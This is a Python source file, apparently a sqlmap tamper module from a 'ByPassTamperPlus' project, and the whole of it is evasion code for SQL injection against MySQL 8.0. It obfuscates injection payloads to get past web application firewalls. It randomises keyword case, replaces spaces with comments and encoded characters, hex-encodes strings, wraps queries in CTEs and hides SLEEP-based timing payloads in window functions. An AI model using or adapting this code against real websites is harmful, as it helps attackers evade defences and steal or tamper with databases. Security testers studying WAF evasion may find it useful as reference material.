#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mysql80_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):

    if not payload:
        return payload

    def random_case(word):
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)

    def general_obfuscate(p):

        keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "GROUP_CONCAT", "CONCAT",
            "INFORMATION_SCHEMA", "TABLES", "COLUMNS", "TABLE_NAME", "COLUMN_NAME",
            "USER", "CURRENT_USER", "DATABASE", "AS", "LIMIT", "OFFSET", "VERSION",
            "WITH", "RECURSIVE", "CTE", "ROW_NUMBER", "OVER", "ORDER", "BY",
            "REGEXP_REPLACE", "REGEXP_LIKE"
        ]
        for kw in keywords:
            p = re.sub(r"(?i)\b%s\b" % kw, lambda m: random_case(m.group(0)), p)

        p = re.sub(r"(?i)SUBSTRING\(", lambda m: random_case(random.choice(["MID(", "SUBSTR("])), p)

        spaces = ["/**/", "%0a", "%09", "%0b", "%0c", "+", "/*%00*/", "()", "%a0", "%0d"]
        p = re.sub(r" ", lambda m: random.choice(spaces), p)

        p = re.sub(r"'([^']*)'", lambda m: "0x" + m.group(1).encode("utf-8").hex(), p)

        return p

    if "SELECT" in payload.upper() and "WITH" not in payload.upper():
        payload = re.sub(r"(?i)SELECT\b(.*?)\bFROM\b(.*?)\b", r"WITH cte AS (SELECT \1 FROM \2) SELECT * FROM cte", payload)

    payload = re.sub(r"(?i)SLEEP\((\d+)\)", r"(SELECT ROW_NUMBER() OVER (ORDER BY (SELECT \1 WHERE 1=1 AND SLEEP(\1))))", payload)

    def regexp_obfuscate_string(match):
        string = match.group(1)
        if len(string) > 1:
            part1 = string[0]
            part2 = string[1:]
            hex_p1 = "0x" + part1.encode("utf-8").hex()
            hex_p2 = "0x" + part2.encode("utf-8").hex()
            return "REGEXP_REPLACE(CONCAT(%s,%s), %s, %s)" % (hex_p1, hex_p2, hex_p1, hex_p1)
        return match.group(0)

    payload = re.sub(r"'([^']*)'", regexp_obfuscate_string, payload)

    payload = general_obfuscate(payload)

    return payload
